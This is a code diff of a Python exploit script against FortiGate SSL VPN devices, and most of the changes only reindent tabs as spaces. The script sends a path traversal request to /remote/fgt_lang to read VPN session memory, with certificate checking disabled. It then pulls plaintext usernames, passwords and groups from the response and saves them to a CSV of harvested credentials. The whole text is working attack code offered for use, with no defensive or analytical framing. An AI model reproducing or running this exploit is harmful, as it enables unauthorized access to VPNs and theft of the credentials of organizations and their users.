@@ -16,48 +16,51 @@ from IPy import IP
 import OpenSSL.crypto as crypto
 
 def exploit(target):
-	target = target.strip()
-	print('[*] '+str(target)+' processing')
-	try:
-		url = 'https://'+str(target)+'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
-		req = urllib.request.urlopen(url, None, context=NOSSL, timeout=5)
-		result = req.read()
-		if req.code == int(200) and str('var fgt_lang =') in str(result):
-			subjectCN = getSubjectCN(target)
-			print('[!] '+str(target)+' ('+subjectCN+') appears to be vulnerable ('+str(len(result))+') bytes returned')
-			parse(target, result, subjectCN)
-		else:
-			print('[!] '+str(target)+' does not appear to be vulnerable')
-	except urllib.error.HTTPError as e:
-		print('[!] '+str(target)+' does not appear to be vulnerable ('+str(e.code)+', +'+str(e.reason)+')')
-	except urllib.error.URLError as e:
-		print('[!] '+str(target)+' does not appear to be vulnerable (URL seems to be invalid)')
-	except TimeoutError:
-		print('[!] '+str(target)+' Timed Out')
-	except:   
-		print('[!] '+str(target)+' unhandled error :(')
+    target = target.strip()
+    print('[*] '+str(target)+' processing')
+    try:
+        url = 'https://'+str(target)+'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
+        req = urllib.request.urlopen(url, None, context=NOSSL, timeout=5)
+        result = req.read()
+        if req.code == int(200) and str('var fgt_lang =') in str(result):
+            subjectCN = getSubjectCN(target)
+            print('[!] '+str(target)+' ('+subjectCN+') appears to be vulnerable ('+str(len(result))+') bytes returned')
+            parse(target, result, subjectCN)
+        else:
+            print('[!] '+str(target)+' does not appear to be vulnerable')
+    except urllib.error.HTTPError as e:
+        print('[!] '+str(target)+' does not appear to be vulnerable ('+str(e.code)+', +'+str(e.reason)+')')
+    except urllib.error.URLError as e:
+        print('[!] '+str(target)+' does not appear to be vulnerable (URL seems to be invalid)')
+    except TimeoutError:
+        print('[!] '+str(target)+' Timed Out')
+    except:   
+        print('[!] '+str(target)+' unhandled error :(')
 
 def parse(target, process, subjectCN):
-	unprintable = False
-	comp = bytearray()
-	counter = 0
-	foundcount = 0
-	for byte in process:
-		if byte == 0x00:
-			# Throw these out
-			counter = counter + 1
-			continue
-		comp.append(byte)
-		comp = comp[-2:]
-		if comp == LOOKFOR or comp == LOOKFORTWO:
-			grabuser(target, process, counter, subjectCN)
-			foundcount = foundcount + 1
-		counter= counter + 1
-	if foundcount == 0:
-		containsIP(process, target)
-	# Commented out as we don't need these but could come in useful for debugging
-	#print(getBinarytext(process,0,len(process)))
-	#writeBinary(process, target)
+    comp = bytearray()
+    empty = bytearray()
+    counter = 0
+    foundcount = 0
+    for byte in process:
+        if byte == 0x00:
+            # Throw these out
+            counter = counter + 1
+            continue
+        if empty == comp:
+            comp.append(byte)
+        else:
+            comp.append(byte)
+            comp = comp[-2:]
+        if comp == LOOKFOR or comp == LOOKFORTWO:
+            grabuser(target, process, counter, subjectCN)
+            foundcount = foundcount + 1
+        counter= counter + 1
+    if foundcount == 0:
+        containsIP(process, target)
+    # Commented out as we don't need these but could come in useful for debugging
+    #print(getBinarytext(process,0,len(process)))
+    #writeBinary(process, target)
 
 def getSubjectCN(url):
     try:
@@ -80,61 +83,62 @@ def getSubjectCN(url):
     except: 
         return '[?] SSL NAME Grab Error Proberbly Timed Out'
 
-def grabuser(target, process, frombyte, subjectCN):	
-	extip = grabtext(process,frombyte+1)
-	if isIP(extip):
-		username = grabtext(process,frombyte+37)
-		password = grabtext(process,frombyte+423)
-		group = grabtext(process,frombyte+552)
-		print('[!] '+str(target)+' ('+subjectCN+') USERFOUND U:'+str(username)+', P:'+str(password)+', G:'+str(group)+', IP:'+str(extip))
-		# Prob not the best way to do this but it works...
-		RESULTS.append([str(target), str(subjectCN), str(username), str(password), str(group), str(extip)])
-	#else:
-	#	print('[?] False Positive: '+extip)
+def grabuser(target, process, frombyte, subjectCN):     
+    extip = grabtext(process,frombyte+1)
+    if isIP(extip):
+        username = grabtext(process,frombyte+37)
+        password = grabtext(process,frombyte+423)
+        group = grabtext(process,frombyte+552)
+        print('[!] '+str(target)+' ('+subjectCN+') USERFOUND U:'+str(username)+', P:'+str(password)+', G:'+str(group)+', IP:'+str(extip))
+        # Prob not the best way to do this but it works...
+        RESULTS.append([str(target), str(subjectCN), str(username), str(password), str(group), str(extip)])
+    #else:
+    #       print('[?] False Positive: '+extip)
 
 def grabtext(process,startbyte):
-	tmpstr = ''
-	for byte in process[startbyte:]:
-		if byte in PRINTABLE:
-			tmpstr+=chr(byte)
-		else:
-			break
-	return tmpstr
+    tmpstr = ''
+    for byte in process[startbyte:]:
+        if byte in PRINTABLE:
+            tmpstr+=chr(byte)
+        else:
+            break
+    return tmpstr
 
 def writeBinary(process,target):
-	f = open('byteoutput_'+target+'.bin', "wb")
-	f.write(bytearray(process))
+    f = open('byteoutput_'+target+'.bin', "wb")
+    f.write(bytearray(process))
 
 def getBinarytext(process,startbyte,endbyte):
-	text = ''
-	try:
-		unprintable = False
-		for byte in process[startbyte:endbyte]:
-			if byte in PRINTABLE:
-				text = text + chr(byte)
-				unprintable = False
-			else:
-				if unprintable == False:
-					text = text + '...'
-					unprintable = True
-	except Exception as e:   
-	    print('[!] '+str(e))
-	return text
+    text = ''
+    try:
+        unprintable = False
+        for byte in process[startbyte:endbyte]:
+            if byte in PRINTABLE:
+                text = text + chr(byte)
+                unprintable = False
+            else:
+                if unprintable == False:
+                    text = text + '...'
+                    unprintable = True
+    except Exception as e:   
+        print('[!] '+str(e))
+    return text
 
 def isIP(lookup):
-	try:
-		IP(lookup)
-		return True
-	except:
-		return False
+    try:
+        IP(lookup)
+        return True
+    except:
+        print('here')
+        return False
 
 def containsIP(process, target):
-	# Hacky IPv4 check to see if we missed creds whilst egg hunting, if we did spit out the BIN for analysis
-	# hexdump -C byteoutput_TARGET.bin | more
-	m = re.match(r"((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)))",getBinarytext(process,0,len(process)))
-	if m:
-		print('[?] '+str(target)+' IPs found but no creds, check the bytes used to hunt')
-		writeBinary(process, target)
+    # Hacky IPv4 check to see if we missed creds whilst egg hunting, if we did spit out the BIN for analysis
+    # hexdump -C byteoutput_TARGET.bin | more
+    m = re.match(r"((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)))",getBinarytext(process,0,len(process)))
+    if m:
+        print('[?] '+str(target)+' IPs found but no creds, check the bytes used to hunt')
+        writeBinary(process, target)
 
 
 print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
@@ -160,8 +164,10 @@ RESULTS = []
 NOSSL = ssl.create_default_context()
 NOSSL.check_hostname = False
 NOSSL.verify_mode = ssl.CERT_NONE
-LOOKFOR = bytearray([0x5d,0x01])
-LOOKFORTWO = bytearray([0x5c,0x01])
+#LOOKFOR = bytearray([0x5d,0x01])
+LOOKFOR = bytearray(b'^\x01')
+#LOOKFORTWO = bytearray([0x5c,0x01])
+LOOKFORTWO = bytearray(b'_\x01')
 
 # Read and kickoff processing
 exploit(INPUT)
@@ -172,6 +178,6 @@ with open(OUTPUTFILE, mode='a') as csvfile:
     CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
     CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
     for result in RESULTS:
-    	CSV_WRITER.writerow(result)
-    	count=count+1
+        CSV_WRITER.writerow(result)
+        count=count+1
 print('[*] Finished '+str(count)+' credentials found')
